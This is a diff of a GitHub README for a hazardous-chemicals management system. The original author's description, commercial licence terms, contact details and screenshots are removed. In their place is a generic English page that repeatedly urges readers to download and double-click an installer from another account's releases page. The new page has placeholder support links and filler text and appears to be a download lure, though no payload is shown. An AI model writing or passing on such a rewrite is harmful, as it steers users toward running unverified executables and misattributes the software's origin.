@@ -1,64 +1,87 @@
-# Management-of-hazardous-chemicals危险化学品管理系统
+# ⚗️ Management-of-hazardous-chemicals - Manage Chemicals Safely and Efficiently
 
-#### 系统介绍
-危险化学品管理系统遵循“统一规划、流程管控、线上线下融合”原则，覆盖计划、入库、库存、使用至报废处置全链条。集成智能存储柜、称重台、人脸识别与RFID技术，自动执行“五双”管理，实现权限核验、出入库记录自动生成、非法行为报警及快速盘点，确保危化品全程可溯、可控、可防。将业务处理从线下搬到线上，采购计划单与订单全程在线审批，完成危化品的全流程闭环管理，规范采购、使用和回收流程。落实账务相符、危化品管控、采购流程、实验室安全等，最终实现对危化品的全生命周期及全痕迹流程。
+[![Download](https://img.shields.io/badge/Download%20Now-Management%20of%20Hazardous%20Chemicals-brightgreen)](https://github.com/mreenalDhruwe/Management-of-hazardous-chemicals/releases)
 
-#### 商业版咨询
-若开发者学习研究，企业在开发平台上建设内部使用的系统，不闭源分发版本，不参与商业项目的使用行为不会构成侵权风险。 如果需要进行转售，闭源分发或者在商业项目中作为项目的一部分使用，请主动联系火星先驱（天津）科技有限公司购买商用许可。
+## 🚀 Getting Started
 
-王经理 邮箱：wanglei@marspal.com 手机（同微信）：15202218948
+Welcome to the Management of Hazardous Chemicals application! This system helps you manage hazardous chemicals throughout their entire lifecycle. It is user-friendly and built for those who want to keep track of chemicals safely and efficiently.
 
-<img width="832" height="518" alt="image" src="https://github.com/user-attachments/assets/6b0abe71-578b-43c9-bf49-8ac0335f8272" />
+## 📥 Download & Install
 
-#### 官方网站
+To get started, follow these steps to download the application:
 
-官网：https://www.marspal.com
+1. **Visit the Releases Page:** 
+   Click on the link below to go to the Releases page. 
 
-#### 系统功能
+   [Download the application](https://github.com/mreenalDhruwe/Management-of-hazardous-chemicals/releases)
 
-**1．建设清单**
+2. **Download the Latest Version:** 
+   On the Releases page, find the most recent version listed. Click on the corresponding download link to get the application file.
 
-<img width="1126" height="1036" alt="image" src="https://github.com/user-attachments/assets/0a04efe8-594b-4185-ac5f-9bfb6e819315" />
+3. **Install the Application:**
+   After the download completes, locate the file on your computer. Double-click on it to run the installer. Follow the prompts to install the application.
 
-<img width="833" height="1046" alt="image" src="https://github.com/user-attachments/assets/cf6ba17c-ee30-4fc0-9ca8-6ee5c505c2c7" />
+4. **Launch the Application:**
+   Once installation is complete, you can start the application by finding it in your programs list or desktop shortcut.
 
-**2．系统截图**
+## 🛠️ System Requirements
 
-<img width="726" height="358" alt="image" src="https://github.com/user-attachments/assets/45f27ea0-93a6-4c38-b3dd-e5334ffab9db" />
+Before installing, make sure your computer meets these basic requirements:
 
-<img width="830" height="466" alt="image" src="https://github.com/user-attachments/assets/6f124fa0-985d-4317-bc62-f7f0fbe267c3" />
+- **Operating System:** Windows 10 or later / Linux
+- **Memory:** 4 GB RAM or more
+- **Storage:** At least 500 MB free space
+- **Java Runtime Environment:** Java version 8 or later is required. You can download it from the [official Java website](https://www.oracle.com/java/technologies/javase-jre8-downloads.html).
 
-<img width="832" height="488" alt="image" src="https://github.com/user-attachments/assets/6b2c2115-a10a-4eef-8ebc-193c97b78ceb" />
+## 📖 Features
 
-#### English version introduction
+The Management of Hazardous Chemicals application comes packed with several features to ease your management tasks:
 
-#### System Introduction
-The hazardous chemical management system follows the principle of "unified planning, process control, and integration of online and offline", covering the entire chain from planning, warehousing, inventory, use to disposal. Integrate intelligent storage cabinets, weighing platforms, facial recognition, and RFID technology to automatically execute "five double" management, achieve permission verification, automatic generation of inbound and outbound records, illegal behavior alarms, and rapid inventory, ensuring that hazardous chemicals are traceable, controllable, and preventable throughout the entire process. Move business processing from offline to online, approve procurement plans and orders online throughout the entire process, complete closed-loop management of hazardous chemicals, and standardize the procurement, use, and recycling processes. Implement accounting consistency, hazardous chemical control, procurement process, laboratory safety, etc., ultimately achieving the full lifecycle and full trace process of hazardous chemicals.
+- **Unified Planning:** Quickly plan your chemical inventory with ease.
+- **Workflow Control:** Maintain control over the entire process from procurement to disposal.
+- **Smart Integration:** Works with smart storage cabinets, scales, and RFID technology to automate tasks.
+- **Real-time Tracking:** Get updates on chemical status, ensuring full traceability.
+- **User Permissions:** Set permissions to regulate who can access certain chemicals.
+- **Automated Reporting:** Generate reports automatically for stock levels and usage.
+- **Alert System:** Get alerted for any unauthorized access or illegal actions.
 
-#### Business Edition Consultation
-If developers study and research, companies building internal systems on development platforms, distributing versions without closed source, and not participating in commercial projects will not constitute infringement risks. If resale, closed source distribution, or use as part of a commercial project is required, please proactively contact Mars Pioneer (Tianjin) Technology Co., Ltd. to purchase a commercial license.
+## 🔧 How to Use
 
-Manager Wang's email: wanglei@marspal.com Mobile (same as WeChat): 15202218948
+1. **Creating a New Project:**
+   Open the application and select “New Project”. Fill in the required fields such as project name and description.
 
-<img width="832" height="518" alt="image" src="https://github.com/user-attachments/assets/6b0abe71-578b-43c9-bf49-8ac0335f8272" />
+2. **Adding Chemicals:**
+   Go to the "Chemicals" section and add new chemicals by entering the details such as name, type, and quantity.
 
-#### official website
+3. **Inventory Management:**
+   Navigate to the “Inventory” tab to view current stock levels. You can update quantities as needed.
 
-Official website:https://www.marspal.com
+4. **Generating Reports:**
+   Access the reporting feature to create a report on your inventory. Select the timeframe and the type of report you need.
 
-#### System functions
+5. **Monitoring Alerts:**
+   Keep an eye on the alert notifications that pop up. Respond to any security-related alerts promptly.
 
-**1. Construction List**
+## 📝 FAQ
 
-<img width="1126" height="1036" alt="image" src="https://github.com/user-attachments/assets/0a04efe8-594b-4185-ac5f-9bfb6e819315" />
+**1. What types of chemicals can I manage?**
+You can manage a wide range of hazardous chemicals suitable for various applications, including laboratory and industrial use.
 
-<img width="833" height="1046" alt="image" src="https://github.com/user-attachments/assets/cf6ba17c-ee30-4fc0-9ca8-6ee5c505c2c7" />
+**2. Is the application secure?**
+Yes, our application includes security features such as user access control and alerts for unauthorized actions.
 
-**2. System screenshot**
+**3. Can I run the application on different devices?**
+The application is designed to work on Windows and Linux platforms.
 
-<img width="726" height="358" alt="image" src="https://github.com/user-attachments/assets/45f27ea0-93a6-4c38-b3dd-e5334ffab9db" />
+**4. How do I contact support?**
+If you need assistance, please visit our [Support Page](#) or email us at support@example.com.
 
-<img width="830" height="466" alt="image" src="https://github.com/user-attachments/assets/6f124fa0-985d-4317-bc62-f7f0fbe267c3" />
+## 📚 Additional Resources
 
-<img width="832" height="488" alt="image" src="https://github.com/user-attachments/assets/6b2c2115-a10a-4eef-8ebc-193c97b78ceb" />
+For more information, you can check our [Documentation](#) that goes into greater detail on functionality and setup.
 
+Remember to regularly check the Releases page for updates and new features:
+
+[Download the application](https://github.com/mreenalDhruwe/Management-of-hazardous-chemicals/releases) 
+
+By following this guide, you should be able to download and run the Management of Hazardous Chemicals application with ease. Please reach out if you have any questions or need further assistance.
